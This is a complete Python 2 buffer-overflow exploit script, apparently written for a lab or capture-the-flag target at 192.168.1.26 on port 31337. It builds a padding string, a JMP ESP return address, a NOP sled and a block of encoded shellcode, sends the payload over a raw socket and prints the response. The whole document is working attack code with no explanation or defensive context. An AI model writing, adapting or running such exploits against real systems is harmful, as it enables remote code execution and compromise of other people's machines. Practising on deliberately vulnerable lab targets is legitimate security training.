#!/usr/bin/env python2
import socket
import sys  #for exit
import struct
import time

host = "192.168.1.26"
port = 31337


buf =  ""
buf += "\xdb\xdd\xd9\x74\x24\xf4\xbb\xf3\x85\x95\x86\x5a\x29"
buf += "\xc9\xb1\x52\x31\x5a\x17\x83\xea\xfc\x03\xa9\x96\x77"
buf += "\x73\xb1\x71\xf5\x7c\x49\x82\x9a\xf5\xac\xb3\x9a\x62"
buf += "\xa5\xe4\x2a\xe0\xeb\x08\xc0\xa4\x1f\x9a\xa4\x60\x10"
buf += "\x2b\x02\x57\x1f\xac\x3f\xab\x3e\x2e\x42\xf8\xe0\x0f"
buf += "\x8d\x0d\xe1\x48\xf0\xfc\xb3\x01\x7e\x52\x23\x25\xca"
buf += "\x6f\xc8\x75\xda\xf7\x2d\xcd\xdd\xd6\xe0\x45\x84\xf8"
buf += "\x03\x89\xbc\xb0\x1b\xce\xf9\x0b\x90\x24\x75\x8a\x70"
buf += "\x75\x76\x21\xbd\xb9\x85\x3b\xfa\x7e\x76\x4e\xf2\x7c"
buf += "\x0b\x49\xc1\xff\xd7\xdc\xd1\x58\x93\x47\x3d\x58\x70"
buf += "\x11\xb6\x56\x3d\x55\x90\x7a\xc0\xba\xab\x87\x49\x3d"
buf += "\x7b\x0e\x09\x1a\x5f\x4a\xc9\x03\xc6\x36\xbc\x3c\x18"
buf += "\x99\x61\x99\x53\x34\x75\x90\x3e\x51\xba\x99\xc0\xa1"
buf += "\xd4\xaa\xb3\x93\x7b\x01\x5b\x98\xf4\x8f\x9c\xdf\x2e"
buf += "\x77\x32\x1e\xd1\x88\x1b\xe5\x85\xd8\x33\xcc\xa5\xb2"
buf += "\xc3\xf1\x73\x14\x93\x5d\x2c\xd5\x43\x1e\x9c\xbd\x89"
buf += "\x91\xc3\xde\xb2\x7b\x6c\x74\x49\xec\x53\x21\x50\xe1"
buf += "\x3b\x30\x52\x54\x27\xbd\xb4\xcc\x48\xe8\x6f\x79\xf0"
buf += "\xb1\xfb\x18\xfd\x6f\x86\x1b\x75\x9c\x77\xd5\x7e\xe9"
buf += "\x6b\x82\x8e\xa4\xd1\x05\x90\x12\x7d\xc9\x03\xf9\x7d"
buf += "\x84\x3f\x56\x2a\xc1\x8e\xaf\xbe\xff\xa9\x19\xdc\xfd"
buf += "\x2c\x61\x64\xda\x8c\x6c\x65\xaf\xa9\x4a\x75\x69\x31"
buf += "\xd7\x21\x25\x64\x81\x9f\x83\xde\x63\x49\x5a\x8c\x2d"
buf += "\x1d\x1b\xfe\xed\x5b\x24\x2b\x98\x83\x95\x82\xdd\xbc"
buf += "\x1a\x43\xea\xc5\x46\xf3\x15\x1c\xc3\x13\xf4\xb4\x3e"
buf += "\xbc\xa1\x5d\x83\xa1\x51\x88\xc0\xdf\xd1\x38\xb9\x1b"
buf += "\xc9\x49\xbc\x60\x4d\xa2\xcc\xf9\x38\xc4\x63\xf9\x68"

overflow = "A" * 146
#ret = "\xc3\x14\x04\x08" 
espjmp=0x080414c3
ret = struct.pack('<L', espjmp) 
nopSled = '\x90' * 15
payload = overflow + ret + nopSled + buf + '\n'
#payload = "A" * 40

espjmp2="0x080416bf"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try: 
    s.connect((host, 31337))
except:
    print "[-] Connection to target failed."
    sys.exit(0)

print "[*] Sending " + str(len(payload)) + " bytes to " + host 

try:
    s.send(payload)
    time.sleep(0.1)
    s.shutdown(socket.SHUT_WR)
except: 
    print "[-] Send Failed."
    sys.exit(0)

res = ""
try:
    while 1:
        data = s.recv(16)
        if data == "":
            break
        res += data
    print(res)
except:
    print "recv failed"
    s.close()
    

# data = s.recv(1)

#get reply and print
#print "[+] Received: " + data 
s.close()
sys.exit(0)


